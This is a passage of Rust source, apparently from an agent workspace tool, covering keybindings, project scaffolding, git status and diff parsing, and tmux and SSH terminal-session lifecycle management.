    pub retry_queue_size: usize,
    pub last_tick_at: Option<DateTime<Utc>>,
    pub total_dispatched: u64,
    pub total_completed: u64,
    pub total_failed: u64,
    pub total_retried: u64,
    pub recent_runs: Vec<AutomationRunView>,
}

/// Reject path components that could traverse directories.
pub(crate) fn validate_path_component(name: &str, label: &str) -> Result<(), String> {
    if name.is_empty() {
        return Err(format!("{label} must not be empty"));
    }
    if name.contains('/') || name.contains('\\') || name.contains('\0') || name.contains("..") {
        return Err(format!(
            "{label} must not contain '/', '\\\\', '\\0', or '..'"
        ));
    }
    Ok(())
}

/// Parse a priority string with fallback to P3 for unknown values.
pub(crate) fn map_priority(priority: &str) -> Priority {
    priority.parse().unwrap_or(Priority::P3)
}

/// Parse a status string with fallback to Planned for unknown values.
pub(crate) fn parse_status(status: &str) -> TaskStatus {
    status.parse().unwrap_or(TaskStatus::Planned)
}

/// Convert a TaskStatus to its canonical string representation.
pub(crate) fn status_to_str(status: &TaskStatus) -> String {
    status.to_string()
}

/// Convert a Priority to its canonical string representation.
pub(crate) fn map_priority_str(priority: &Priority) -> String {
    priority.to_string()
}

fn parse_dt(input: Option<String>) -> Option<DateTime<Utc>> {
    input
        .and_then(|v| DateTime::parse_from_rfc3339(&v).ok())
        .map(|v| v.with_timezone(&Utc))
}

pub(crate) fn normalize_rule_scope(scope: &str) -> &'static str {
    if scope.eq_ignore_ascii_case("convention") || scope.eq_ignore_ascii_case("conventions") {
        "convention"
    } else {
        "rule"
    }
}

fn scope_default_dir(scope: &str) -> &'static str {
    if normalize_rule_scope(scope) == "convention" {
        ".pnevma/conventions"
    } else {
        ".pnevma/rules"
    }
}

pub(crate) fn slugify_with_fallback(input: &str, fallback: &str) -> String {
    let mut out = String::with_capacity(input.len());
    let mut last_sep = false;
    for ch in input.chars() {
        if ch.is_ascii_alphanumeric() {
            out.push(ch.to_ascii_lowercase());
            last_sep = false;
        } else if !last_sep {
            out.push('-');
            last_sep = true;
        }
    }
    let trimmed = out.trim_matches('-');
    if trimmed.is_empty() {
        fallback.to_string()
    } else {
        trimmed.to_string()
    }
}

fn default_keybindings() -> &'static HashMap<String, String> {
    static DEFAULTS: OnceLock<HashMap<String, String>> = OnceLock::new();
    DEFAULTS.get_or_init(|| {
        HashMap::from_iter([
            // Project-level keybindings
            ("command_palette.toggle".to_string(), "Cmd+K".to_string()),
            ("command_palette.next".to_string(), "ArrowDown".to_string()),
            ("command_palette.prev".to_string(), "ArrowUp".to_string()),
            ("command_palette.execute".to_string(), "Enter".to_string()),
            ("pane.focus_next".to_string(), "Cmd+]".to_string()),
            ("pane.focus_prev".to_string(), "Cmd+[".to_string()),
            ("task.new".to_string(), "Cmd+Shift+N".to_string()),
            (
                "task.dispatch_next_ready".to_string(),
                "Cmd+Shift+Y".to_string(),
            ),
            ("review.approve_next".to_string(), "Cmd+Shift+A".to_string()),
            // Menu keybindings — File
            ("menu.new_tab".to_string(), "Cmd+T".to_string()),
            ("menu.new_terminal".to_string(), "Cmd+N".to_string()),
            ("menu.open_workspace".to_string(), "Cmd+O".to_string()),
            ("menu.close_pane".to_string(), "Cmd+W".to_string()),
            ("menu.close_window".to_string(), "Cmd+Shift+W".to_string()),
            // Menu keybindings — View
            ("menu.toggle_sidebar".to_string(), "Cmd+B".to_string()),
            (
                "menu.toggle_right_inspector".to_string(),
                "Cmd+Shift+B".to_string(),
            ),
            (
                "menu.toggle_command_center".to_string(),
                "Cmd+Shift+C".to_string(),
            ),
            (
                "menu.toggle_browser_drawer".to_string(),
                "Cmd+Opt+B".to_string(),
            ),
            (
                "menu.browser_drawer_shorter".to_string(),
                "Cmd+Opt+-".to_string(),
            ),
            (
                "menu.browser_drawer_taller".to_string(),
                "Cmd+Opt+=".to_string(),
            ),
            ("menu.pin_browser".to_string(), "Cmd+Shift+\\".to_string()),
            (
                "menu.command_palette".to_string(),
                "Cmd+Shift+P".to_string(),
            ),
            // Menu keybindings — Edit
            ("menu.find_in_page".to_string(), "Cmd+F".to_string()),
            (
                "menu.focus_browser_address".to_string(),
                "Cmd+L".to_string(),
            ),
            // Menu keybindings — Pane
            ("menu.split_right".to_string(), "Cmd+D".to_string()),
            ("menu.split_down".to_string(), "Cmd+Shift+D".to_string()),
            ("menu.next_pane".to_string(), "Cmd+]".to_string()),
            ("menu.previous_pane".to_string(), "Cmd+[".to_string()),
            ("menu.navigate_left".to_string(), "Cmd+Opt+Left".to_string()),
            (
                "menu.navigate_right".to_string(),
                "Cmd+Opt+Right".to_string(),
            ),
            ("menu.navigate_up".to_string(), "Cmd+Opt+Up".to_string()),
            ("menu.navigate_down".to_string(), "Cmd+Opt+Down".to_string()),
            (
                "menu.toggle_split_zoom".to_string(),
                "Cmd+Shift+Enter".to_string(),
            ),
            ("menu.equalize_splits".to_string(), "Cmd+Ctrl+=".to_string()),
            // Menu keybindings — Pane jump
            ("menu.goto_pane_1".to_string(), "Cmd+1".to_string()),
            ("menu.goto_pane_2".to_string(), "Cmd+2".to_string()),
            ("menu.goto_pane_3".to_string(), "Cmd+3".to_string()),
            ("menu.goto_pane_4".to_string(), "Cmd+4".to_string()),
            ("menu.goto_pane_5".to_string(), "Cmd+5".to_string()),
            ("menu.goto_pane_6".to_string(), "Cmd+6".to_string()),
            ("menu.goto_pane_7".to_string(), "Cmd+7".to_string()),
            ("menu.goto_pane_8".to_string(), "Cmd+8".to_string()),
            ("menu.goto_last_pane".to_string(), "Cmd+9".to_string()),
            // Menu keybindings — Window
            (
                "menu.toggle_fullscreen".to_string(),
                "Cmd+Enter".to_string(),
            ),
            ("menu.next_workspace".to_string(), "Cmd+Shift+]".to_string()),
            (
                "menu.previous_workspace".to_string(),
                "Cmd+Shift+[".to_string(),
            ),
            ("menu.minimize".to_string(), "Cmd+M".to_string()),
        ])
    })
}

/// Actions whose shortcuts cannot be changed by the user.
fn is_protected_action(action: &str) -> bool {
    matches!(action, "menu.quit" | "menu.settings")
}

fn is_supported_keybinding_action(action: &str) -> bool {
    default_keybindings().contains_key(action) && !is_protected_action(action)
}

/// Normalize a shortcut string for comparison: sort modifiers, lowercase key.
fn normalize_shortcut(shortcut: &str) -> String {
    let parts: Vec<&str> = shortcut.split('+').map(|p| p.trim()).collect();
    let mut mods: Vec<&str> = Vec::new();
    let mut key = "";
    for part in &parts {
        match part.to_lowercase().as_str() {
            "cmd" | "mod" | "super" => mods.push("cmd"),
            "shift" => mods.push("shift"),
            "opt" | "alt" => mods.push("opt"),
            "ctrl" | "control" => mods.push("ctrl"),
            _ => key = part,
        }
    }
    mods.sort();
    if !key.is_empty() {
        mods.push(key);
    }
    let mut result = mods.join("+").to_lowercase();
    // Canonicalize key name aliases (must match Swift ConflictDetector.canonicalKeyName).
    // The key is always the last component after the final '+'.
    if result.ends_with("return") {
        let prefix_len = result.len() - "return".len();
        result.replace_range(prefix_len.., "enter");
    } else if result.ends_with("backspace") {
        let prefix_len = result.len() - "backspace".len();
        result.replace_range(prefix_len.., "delete");
    }
    result
}

fn is_git_available() -> bool {
    std::process::Command::new("git")
        .arg("--version")
        .output()
        .map(|out| out.status.success())
        .unwrap_or(false)
}

fn project_is_initialized(path: &Path) -> bool {
    path.join("pnevma.toml").is_file() && path.join(".pnevma").is_dir()
}

fn normalize_scaffold_path(path: &str) -> Result<PathBuf, String> {
    let raw = path.trim();
    if raw.is_empty() {
        return Err("path is required".to_string());
    }

    let candidate = if raw == "~" {
        std::env::var_os("HOME")
            .map(PathBuf::from)
            .ok_or_else(|| "HOME environment variable not set".to_string())?
    } else if let Some(suffix) = raw.strip_prefix("~/") {
        std::env::var_os("HOME")
            .map(PathBuf::from)
            .ok_or_else(|| "HOME environment variable not set".to_string())?
            .join(suffix)
    } else {
        PathBuf::from(raw)
    };

    if candidate.is_absolute() {
        Ok(candidate)
    } else {
        let cwd = std::env::current_dir().map_err(|e| e.to_string())?;
        Ok(cwd.join(candidate))
    }
}

fn normalize_default_provider(provider: Option<&str>) -> String {
    match provider.map(str::trim) {
        Some("codex") => "codex".to_string(),
        Some("claude-code") => "claude-code".to_string(),
        Some(value) if !value.is_empty() => value.to_string(),
        _ => "claude-code".to_string(),
    }
}

fn toml_escaped(value: &str) -> String {
    value
        .replace('\\', "\\\\")
        .replace('"', "\\\"")
        .replace('\n', " ")
        .trim()
        .to_string()
}

fn build_default_project_toml(
    root: &Path,
    project_name: Option<&str>,
    project_brief: Option<&str>,
    default_provider: &str,
) -> String {
    let inferred_name = root
        .file_name()
        .and_then(|value| value.to_str())
        .unwrap_or("Pnevma Project");
    let name = toml_escaped(
        project_name
            .map(str::trim)
            .filter(|value| !value.is_empty())
            .unwrap_or(inferred_name),
    );
    let brief = toml_escaped(
        project_brief
            .map(str::trim)
            .filter(|value| !value.is_empty())
            .unwrap_or("Agent-era execution workspace"),
    );
    let provider = toml_escaped(default_provider);

    format!(
        "\
[project]
name = \"{name}\"
brief = \"{brief}\"

[agents]
default_provider = \"{provider}\"
max_concurrent = 4

[branches]
target = \"main\"
naming = \"task/{{id}}-{{slug}}\"

[automation]
socket_enabled = true
socket_path = \".pnevma/run/control.sock\"
socket_auth = \"same-user\"

[rules]
paths = [\".pnevma/rules/*.md\"]

[conventions]
paths = [\".pnevma/conventions/*.md\"]
"
    )
}

async fn discover_markdown_files(
    patterns: &[String],
    project_path: &Path,
) -> Result<Vec<PathBuf>, String> {
    let mut seen = HashSet::new();
    let mut out = Vec::new();
    for pattern in patterns {
        let absolute = if Path::new(pattern).is_absolute() {
            PathBuf::from(pattern)
        } else {
            project_path.join(pattern)
        };
        if pattern.contains('*') {
            let Some(parent) = absolute.parent() else {
                continue;
            };
            let mut entries = match tokio::fs::read_dir(parent).await {
                Ok(entries) => entries,
                Err(err) if err.kind() == std::io::ErrorKind::NotFound => continue,
                Err(err) => return Err(err.to_string()),
            };
            while let Some(entry) = entries.next_entry().await.map_err(|e| e.to_string())? {
                let path = entry.path();
                if !path.is_file() {
                    continue;
                }
                if path.extension().and_then(|ext| ext.to_str()) != Some("md") {
                    continue;
                }
                let key = path.to_string_lossy().to_string();
                if seen.insert(key) {
                    out.push(path);
                }
            }
        } else if absolute.is_file() {
            let key = absolute.to_string_lossy().to_string();
            if seen.insert(key) {
                out.push(absolute);
            }
        }
    }
    out.sort();
    Ok(out)
}

pub(crate) async fn ensure_rule_rows(
    db: &Db,
    project_id: Uuid,
    project_path: &Path,
    scope: &str,
    patterns: &[String],
) -> Result<(), String> {
    let scope = normalize_rule_scope(scope);
    let files = discover_markdown_files(patterns, project_path).await?;
    let existing = db
        .list_rules(&project_id.to_string(), Some(scope))
        .await
        .map_err(|e| e.to_string())?;
    let mut by_path = HashMap::new();
    for row in existing {
        by_path.insert(row.path.clone(), row);
    }
    for file in files {
        let rel = file
            .strip_prefix(project_path)
            .unwrap_or(&file)
            .to_string_lossy()
            .to_string();
        if by_path.contains_key(&rel) {
            continue;
        }
        let name = file
            .file_stem()
            .and_then(|s| s.to_str())
            .map(ToString::to_string)
            .unwrap_or_else(|| "entry".to_string());
        db.upsert_rule(&RuleRow {
            id: Uuid::new_v4().to_string(),
            project_id: project_id.to_string(),
            name,
            path: rel,
            scope: Some(scope.to_string()),
            active: true,
        })
        .await
        .map_err(|e| e.to_string())?;
    }
    Ok(())
}

pub(crate) async fn load_active_scope_texts(
    db: &Db,
    project_id: Uuid,
    project_path: &Path,
    scope: &str,
) -> Result<Vec<String>, String> {
    let rows = db
        .list_rules(&project_id.to_string(), Some(normalize_rule_scope(scope)))
        .await
        .map_err(|e| e.to_string())?;
    let mut texts = Vec::new();
    for row in rows.into_iter().filter(|r| r.active) {
        let abs = project_path.join(&row.path);
        if let Ok(content) = tokio::fs::read_to_string(abs).await {
            texts.push(content);
        }
    }
    Ok(texts)
}

fn contains_case_insensitive(haystack: &str, needle: &str) -> bool {
    haystack
        .to_ascii_lowercase()
        .contains(&needle.to_ascii_lowercase())
}

fn summarize_match(text: &str, query: &str) -> String {
    if text.is_empty() {
        return String::new();
    }
    let lower_text = text.to_ascii_lowercase();
    let lower_query = query.to_ascii_lowercase();
    let idx = lower_text.find(&lower_query).unwrap_or(0);
    let start = align_to_char_start(text, idx.saturating_sub(80));
    let end = align_to_char_end(text, (idx + lower_query.len() + 120).min(text.len()));
    let mut snippet = text[start..end].replace('\n', " ");
    if start > 0 {
        snippet.insert_str(0, "...");
    }
    if end < text.len() {
        snippet.push_str("...");
    }
    snippet
}

/// Walk forward to the nearest valid UTF-8 char boundary.
fn align_to_char_start(text: &str, pos: usize) -> usize {
    let mut p = pos;
    while p < text.len() && !text.is_char_boundary(p) {
        p += 1;
    }
    p
}

/// Walk backward to the nearest valid UTF-8 char boundary.
fn align_to_char_end(text: &str, pos: usize) -> usize {
    let mut p = pos;
    while p > 0 && !text.is_char_boundary(p) {
        p -= 1;
    }
    p
}

fn parse_porcelain_status_line(line: &str) -> Option<(String, String)> {
    if line.len() < 4 {
        return None;
    }
    let status = line[..2].to_string();
    let path = line[3..].trim();
    if path.is_empty() {
        return None;
    }
    let normalized = if let Some((_, to)) = path.split_once(" -> ") {
        decode_git_status_path(to.trim())
    } else {
        decode_git_status_path(path)
    };
    Some((normalized, status))
}

fn parse_porcelain_status_z(output: &str) -> Vec<(String, String)> {
    let mut entries = Vec::new();
    let mut parts = output.split('\0').filter(|part| !part.is_empty());

    while let Some(part) = parts.next() {
        if part.len() < 4 {
            continue;
        }

        let status = part[..2].to_string();
        let path = part[3..].to_string();
        entries.push((path, status.clone()));

        if status.contains('R') || status.contains('C') {
            let _ = parts.next();
        }
    }

    entries
}

fn decode_git_status_path(path: &str) -> String {
    if !(path.starts_with('"') && path.ends_with('"') && path.len() >= 2) {
        return path.to_string();
    }

    let inner = &path[1..path.len() - 1];
    let mut bytes = Vec::with_capacity(inner.len());
    let mut chars = inner.chars().peekable();

    while let Some(ch) = chars.next() {
        if ch != '\\' {
            let mut encoded = [0; 4];
            bytes.extend_from_slice(ch.encode_utf8(&mut encoded).as_bytes());
            continue;
        }

        let Some(escaped) = chars.next() else {
            break;
        };
        match escaped {
            '"' => bytes.push(b'"'),
            '\\' => bytes.push(b'\\'),
            'n' => bytes.push(b'\n'),
            'r' => bytes.push(b'\r'),
            't' => bytes.push(b'\t'),
            '0'..='7' => {
                let mut octal = String::from(escaped);
                for _ in 0..2 {
                    if let Some(next) = chars.next_if(|c| matches!(c, '0'..='7')) {
                        octal.push(next);
                    } else {
                        break;
                    }
                }
                if let Ok(value) = u8::from_str_radix(&octal, 8) {
                    bytes.push(value);
                }
            }
            other => {
                let mut encoded = [0; 4];
                bytes.extend_from_slice(other.encode_utf8(&mut encoded).as_bytes());
            }
        }
    }

    String::from_utf8_lossy(&bytes).to_string()
}

fn parse_patch_file_header_path(line: &str) -> Option<String> {
    let raw_path = line
        .strip_prefix("--- ")
        .or_else(|| line.strip_prefix("+++ "))?
        .split('\t')
        .next()?
        .trim();
    if raw_path == "/dev/null" {
        return None;
    }
    Some(
        decode_git_status_path(raw_path)
            .trim_start_matches("a/")
            .trim_start_matches("b/")
            .to_string(),
    )
}

fn parse_diff_patch(patch: &str) -> Vec<DiffFileView> {
    let mut files: Vec<DiffFileView> = Vec::new();
    let mut current_file: Option<DiffFileView> = None;
    let mut current_hunk: Option<DiffHunkView> = None;

    for line in patch.lines() {
        if line.starts_with("diff --git ") {
            if let Some(hunk) = current_hunk.take() {
                if let Some(file) = current_file.as_mut() {
                    file.hunks.push(hunk);
                }
            }
            if let Some(file) = current_file.take() {
                files.push(file);
            }
            current_file = Some(DiffFileView {
                path: "unknown".to_string(),
                hunks: Vec::new(),
            });
            continue;
        }

        if current_hunk.is_none() {
            if let Some(path) = parse_patch_file_header_path(line) {
                if let Some(file) = current_file.as_mut() {
                    file.path = path;
                }
                continue;
            }
        }

        if line.starts_with("@@") {
            if let Some(hunk) = current_hunk.take() {
                if let Some(file) = current_file.as_mut() {
                    file.hunks.push(hunk);
                }
            }
            current_hunk = Some(DiffHunkView {
                header: line.to_string(),
                lines: Vec::new(),
            });
            continue;
        }

        if let Some(hunk) = current_hunk.as_mut() {
            if line.starts_with('+')
                || line.starts_with('-')
                || line.starts_with(' ')
                || line.starts_with('\\')
            {
                hunk.lines.push(line.to_string());
            }
        }
    }

    if let Some(hunk) = current_hunk {
        if let Some(file) = current_file.as_mut() {
            file.hunks.push(hunk);
        }
    }
    if let Some(file) = current_file {
        files.push(file);
    }
    files
}

fn tmux_name_from_session_id(session_id: &str) -> String {
    format!("pnevma_{}", session_id.replace('-', ""))
}

#[allow(dead_code)] // Used in DB rows for legacy tmux sessions
const SESSION_BACKEND_TMUX_COMPAT: &str = "tmux_compat";
const SESSION_BACKEND_REMOTE_SSH_DURABLE: &str = "remote_ssh_durable";
const SESSION_DURABILITY_DURABLE: &str = "durable";
const SESSION_LIFECYCLE_ATTACHED: &str = "attached";
const SESSION_LIFECYCLE_DETACHED: &str = "detached";
const SESSION_LIFECYCLE_REATTACHING: &str = "reattaching";
const SESSION_LIFECYCLE_EXITED: &str = "exited";
const SESSION_LIFECYCLE_LOST: &str = "lost";
const SESSION_LIFECYCLE_ERROR: &str = "error";

#[derive(Debug, Clone, Deserialize)]
struct StoredTerminalLaunchMetadata {
    #[serde(default)]
    remote_target: Option<SessionRemoteTargetInput>,
}

const SESSION_BACKEND_LOCAL_PTY: &str = "local_pty";
const SESSION_BACKEND_LOCAL_DURABLE: &str = "local_durable";

fn default_session_backend() -> String {
    SESSION_BACKEND_LOCAL_DURABLE.to_string()
}

#[allow(dead_code)] // Used for ephemeral local_pty sessions (legacy)
const SESSION_DURABILITY_EPHEMERAL: &str = "ephemeral";

fn default_session_durability() -> String {
    SESSION_DURABILITY_DURABLE.to_string()
}

fn default_session_lifecycle_state() -> String {
    SESSION_LIFECYCLE_ATTACHED.to_string()
}

fn is_remote_ssh_durable_backend(backend: &str) -> bool {
    backend.eq_ignore_ascii_case(SESSION_BACKEND_REMOTE_SSH_DURABLE)
}

fn remote_session_state_mapping(state: &str) -> (String, String) {
    match state {
        "attached" => (
            "running".to_string(),
            SESSION_LIFECYCLE_ATTACHED.to_string(),
        ),
        "detached" => (
            "waiting".to_string(),
            SESSION_LIFECYCLE_DETACHED.to_string(),
        ),
        "reattaching" => (
            "waiting".to_string(),
            SESSION_LIFECYCLE_REATTACHING.to_string(),
        ),
        "lost" => ("complete".to_string(), SESSION_LIFECYCLE_LOST.to_string()),
        "error" => ("error".to_string(), SESSION_LIFECYCLE_ERROR.to_string()),
        _ => ("complete".to_string(), SESSION_LIFECYCLE_EXITED.to_string()),
    }
}

fn ssh_profile_from_remote_target(
    target: &SessionRemoteTargetInput,
) -> Result<pnevma_ssh::SshProfile, String> {
    pnevma_ssh::validate_profile_fields(
        &target.host,
        target.user.as_deref(),
        target.identity_file.as_deref(),
        target.proxy_jump.as_deref(),
    )
    .map_err(|e| e.to_string())?;
    let now = Utc::now();
    Ok(pnevma_ssh::SshProfile {
        id: target.ssh_profile_id.clone(),
        name: target.ssh_profile_name.clone(),
        host: target.host.clone(),
        port: target.port,
        user: target.user.clone(),
        identity_file: target.identity_file.clone(),
        proxy_jump: target.proxy_jump.clone(),
        tags: Vec::new(),
        source: "session_remote_target".to_string(),
        created_at: now,
        updated_at: now,
        use_control_master: None,
    })
}

fn remote_target_from_ssh_profile(
    profile: &pnevma_ssh::SshProfile,
    remote_path: &str,
) -> SessionRemoteTargetInput {
    SessionRemoteTargetInput {
        ssh_profile_id: profile.id.clone(),
        ssh_profile_name: profile.name.clone(),
        host: profile.host.clone(),
        port: profile.port,
        user: profile.user.clone().or_else(|| std::env::var("USER").ok()),
        identity_file: profile.identity_file.clone(),
        proxy_jump: profile.proxy_jump.clone(),
        remote_path: remote_path.to_string(),
    }
}

fn remote_launch_metadata_json(target: &SessionRemoteTargetInput) -> Result<String, String> {
    serde_json::to_string(&json!({
        "launch_mode": "managed_session",
        "start_behavior": "immediate",
        "remote_target": target,
    }))
    .map_err(|e| e.to_string())
}

fn session_lifecycle_state_for_status(status: &str) -> String {
    match status {
        "running" => SESSION_LIFECYCLE_ATTACHED.to_string(),
        "waiting" => SESSION_LIFECYCLE_DETACHED.to_string(),
        "error" => SESSION_LIFECYCLE_ERROR.to_string(),
        _ => SESSION_LIFECYCLE_EXITED.to_string(),
    }
}

fn tmux_attach_launch_command() -> String {
    let tmux = pnevma_ssh::shell_escape_arg(
        pnevma_session::resolve_binary("tmux")
            .to_string_lossy()
            .as_ref(),
    );
    format!(
        r#"{tmux} set -t "$PNEVMA_TMUX_TARGET" status off 2>/dev/null; {tmux} set -t "$PNEVMA_TMUX_TARGET" allow-passthrough all 2>/dev/null; exec {tmux} -u attach-session -t "$PNEVMA_TMUX_TARGET""#
    )
}

fn session_proxy_launch_command(session_id: &str, socket_path: &std::path::Path) -> String {
    let proxy = proxy_binary_path();
    let proxy_str = pnevma_ssh::shell_escape_arg(proxy.to_string_lossy().as_ref());
    let socket_str = pnevma_ssh::shell_escape_arg(socket_path.to_string_lossy().as_ref());
    format!("exec {proxy_str} attach --session {session_id} --socket {socket_str}")
}

fn proxy_binary_path() -> std::path::PathBuf {
    // Look in app bundle Contents/Helpers first, then fall back to cargo build output
    if let Ok(exe) = std::env::current_exe() {
        if let Some(contents) = exe.parent().and_then(|p| p.parent()) {
            let bundled = contents.join("Helpers").join("pnevma-session-proxy");
            if bundled.exists() {
                return bundled;
            }
        }
    }

    // Development fallback: cargo target directory
    let candidate = std::env::var("CARGO_TARGET_DIR")
        .map(std::path::PathBuf::from)
        .unwrap_or_else(|_| std::path::PathBuf::from("target"))
        .join("debug")
        .join("pnevma-session-proxy");
    if candidate.exists() {
        return candidate;
    }

    // Last resort: PATH
    std::path::PathBuf::from("pnevma-session-proxy")
}

fn helper_binary_path() -> std::path::PathBuf {
    // Look in app bundle Contents/Helpers first, then fall back to cargo build output
    if let Ok(exe) = std::env::current_exe() {
        if let Some(contents) = exe.parent().and_then(|p| p.parent()) {
            let bundled = contents.join("Helpers").join("pnevma-remote-helper");
            if bundled.exists() {
                return bundled;
            }
        }
    }

    // Development fallback: cargo target directory
    let candidate = std::env::var("CARGO_TARGET_DIR")
        .map(std::path::PathBuf::from)
        .unwrap_or_else(|_| std::path::PathBuf::from("target"))
        .join("debug")
        .join("pnevma-remote-helper");
    if candidate.exists() {
        return candidate;
    }

    // Last resort: PATH
    std::path::PathBuf::from("pnevma-remote-helper")
}

fn parse_optional_datetime(value: &Option<String>) -> Option<DateTime<Utc>> {
    value
        .as_deref()
        .and_then(|raw| DateTime::parse_from_rfc3339(raw).ok())
        .map(|parsed| parsed.with_timezone(&Utc))
}

fn remote_session_is_live(row: &SessionRow) -> bool {
    matches!(row.status.as_str(), "running" | "waiting")
}

fn remote_session_last_error_for_state(state: &str) -> Option<String> {
    match state {
        "lost" => Some("remote durable session missing on remote host".to_string()),
        "error" => Some("remote durable session reported an error".to_string()),
        _ => None,
    }
}

fn remote_restore_log_outcome(row: &SessionRow) -> String {
    row.restore_status
        .clone()
        .unwrap_or_else(|| row.lifecycle_state.clone())
}

async fn create_session_restore_log_entry(
    db: &Db,
    row: &SessionRow,
    action: &str,
    error_message: Option<String>,
) {
    if let Err(error) = db
        .create_session_restore_log(&SessionRestoreLogRow {
            id: Uuid::new_v4().to_string(),
            session_id: row.id.clone(),
            project_id: row.project_id.clone(),
            action: action.to_string(),
            outcome: remote_restore_log_outcome(row),
            error_message,
            created_at: Utc::now().to_rfc3339(),
        })
        .await
    {
        tracing::warn!(
            session_id = %row.id,
            action,
            error = %error,
            "failed to persist session restore log entry"
        );
    }
}

async fn record_remote_session_restore_outcome(db: &Db, row: &SessionRow, action: &str) {
    let outcome = remote_restore_log_outcome(row);
    if let Err(error) = db.update_session_restore_status(&row.id, &outcome).await {
        tracing::warn!(
            session_id = %row.id,
            action,
            error = %error,
            "failed to persist remote session restore status"
        );
    }
    create_session_restore_log_entry(db, row, action, row.last_error.clone()).await;
}

async fn resolve_ssh_profile_by_id(
    state: &AppState,
    project_db: Option<&Db>,
    profile_id: &str,
) -> Result<Option<pnevma_ssh::SshProfile>, String> {
    if let Ok(global_db) = state.global_db() {
        if let Some(row) = global_db
            .get_global_ssh_profile(profile_id)
            .await
            .map_err(|e| e.to_string())?
        {
            let tags: Vec<String> = serde_json::from_str(&row.tags_json).unwrap_or_default();
            return Ok(Some(pnevma_ssh::SshProfile {
                id: row.id,
                name: row.name,
                host: row.host,
                port: row.port as u16,
                user: row.user,
                identity_file: row.identity_file,
                proxy_jump: row.proxy_jump,
                tags,
                source: row.source,
                created_at: row.created_at,
                updated_at: row.updated_at,
                use_control_master: None,
            }));
        }
    }

    let Some(project_db) = project_db else {
        return Ok(None);
    };
    let row = match project_db.get_ssh_profile(profile_id).await {
        Ok(row) => row,
        Err(_) => return Ok(None),
    };
    let tags: Vec<String> = serde_json::from_str(&row.tags_json).unwrap_or_default();
    Ok(Some(pnevma_ssh::SshProfile {
        id: row.id,
        name: row.name,
        host: row.host,
        port: row.port as u16,
        user: row.user,
        identity_file: row.identity_file,
        proxy_jump: row.proxy_jump,
        tags,
        source: row.source,
        created_at: row.created_at,
        updated_at: row.updated_at,
        use_control_master: None,
    }))
}

async fn resolve_remote_target_for_session(
    db: &Db,
    row: &SessionRow,
) -> Result<Option<SessionRemoteTargetInput>, String> {
    let panes = db
        .list_panes(&row.project_id)
        .await
        .map_err(|e| e.to_string())?;
    for pane in panes {
        if pane.session_id.as_deref() != Some(row.id.as_str()) {
            continue;
        }
        let Some(metadata_json) = pane.metadata_json else {
            continue;
        };
        let Ok(metadata) = serde_json::from_str::<StoredTerminalLaunchMetadata>(&metadata_json)
        else {
            continue;
        };
        if metadata.remote_target.is_some() {
            return Ok(metadata.remote_target);
        }
    }
    Ok(None)
}

async fn resolve_ssh_profile_for_session_row(
    state: &AppState,
    db: &Db,
    row: &SessionRow,
) -> Result<pnevma_ssh::SshProfile, String> {
    if let Some(connection_id) = row.connection_id.as_deref() {
        if let Some(profile) = resolve_ssh_profile_by_id(state, Some(db), connection_id).await? {
            return Ok(profile);
        }
    }

    let target = resolve_remote_target_for_session(db, row)
        .await?
        .ok_or_else(|| format!("missing SSH target metadata for session {}", row.id))?;
    ssh_profile_from_remote_target(&target)
}

fn tmux_tmpdir_for_project(project_path: &Path) -> PathBuf {
    project_path.join(".pnevma").join("data").join("tmux")
}

async fn session_backend_alive(project_path: &Path, session_id: &str) -> bool {
    // Check local durable backend (pnevma-remote-helper managed sessions).
    let state_root = project_path
        .join(".pnevma")
        .join("data")
        .join("local-durable");
    let runner_pid_path = state_root
        .join("sessions")
        .join(session_id)
        .join("runner.pid");
    if let Ok(contents) = tokio::fs::read_to_string(&runner_pid_path).await {
        if let Ok(pid) = contents.trim().parse::<u32>() {
            let alive = TokioCommand::new("kill")
                .args(["-0", &pid.to_string()])
                .stdin(std::process::Stdio::null())
                .stdout(std::process::Stdio::null())
                .stderr(std::process::Stdio::null())
                .status()
                .await
                .map(|s| s.success())
                .unwrap_or(false);
            if alive {
                return true;
            }
        }
    }

    // Check tmux backend (legacy sessions)
    let name = tmux_name_from_session_id(session_id);
    let tmux_tmpdir = tmux_tmpdir_for_project(project_path);
    let _ = tokio::fs::create_dir_all(&tmux_tmpdir).await;
    let tmux_alive = TokioCommand::new(pnevma_session::resolve_binary("tmux"))
        .env("TMUX_TMPDIR", &tmux_tmpdir)
        .args(["has-session", "-t", &name])
        .status()
        .await
        .map(|status| status.success())
        .unwrap_or(false);
    if tmux_alive {
        return true;
    }

    // For local_pty sessions, check if the supervisor has an active handle
    // (this is handled by the supervisor's is_alive check via the backend).
    // If neither tmux nor the supervisor knows about it, it's dead.
    false
}

async fn mark_remote_session_row_lost(
    db: &Db,
    row: &SessionRow,
    reason: String,
    action: &str,
) -> Result<SessionRow, String> {
    let mut lost = row.clone();
    lost.status = "complete".to_string();
    lost.lifecycle_state = SESSION_LIFECYCLE_LOST.to_string();
    lost.pid = None;
    lost.last_heartbeat = Utc::now();
    lost.ended_at = Some(Utc::now().to_rfc3339());
    lost.last_error = Some(reason.clone());
    lost.restore_status = Some(format!("restore_failed:{action}"));
    db.upsert_session(&lost).await.map_err(|e| e.to_string())?;
    if let Ok(project_id) = Uuid::parse_str(&lost.project_id) {
        append_event(
            db,
            project_id,
            None,
            Uuid::parse_str(&lost.id).ok(),
            "session",
            "SessionLost",
            json!({
                "backend": SESSION_BACKEND_REMOTE_SSH_DURABLE,
                "action": action,
                "error": reason,
            }),
        )
        .await;
    }
    create_session_restore_log_entry(db, &lost, action, lost.last_error.clone()).await;
    Ok(lost)
}

async fn refresh_remote_session_row(
    state: &AppState,
    db: &Db,
    row: &SessionRow,
) -> Result<SessionRow, String> {
    let profile = resolve_ssh_profile_for_session_row(state, db, row).await?;
    let remote_session_id = row
        .remote_session_id
        .as_deref()
        .unwrap_or(row.id.as_str())
        .to_string();
    let mut status = pnevma_ssh::remote_session_status(&profile, &remote_session_id)
        .await
        .map_err(|e| e.to_string())?;
    if status.state == "lost" && remote_session_startup_grace_active(row) {
        for _ in 0..REMOTE_SESSION_STATUS_STARTUP_RETRIES {
            tokio::time::sleep(REMOTE_SESSION_STATUS_STARTUP_RETRY_DELAY).await;
            let retried = pnevma_ssh::remote_session_status(&profile, &remote_session_id)
                .await
                .map_err(|e| e.to_string())?;
            if retried.state != "lost" {
                status = retried;
                break;
            }
            status = retried;
        }
    }
    apply_remote_session_status(db, row, &status).await
}

async fn apply_remote_session_status(
    db: &Db,
    row: &SessionRow,
    status: &pnevma_ssh::RemoteSessionStatus,
) -> Result<SessionRow, String> {
    let Some(project_uuid) = Uuid::parse_str(&row.project_id).ok() else {
        return Err(format!("invalid project id for session {}", row.id));
    };
    let session_uuid =
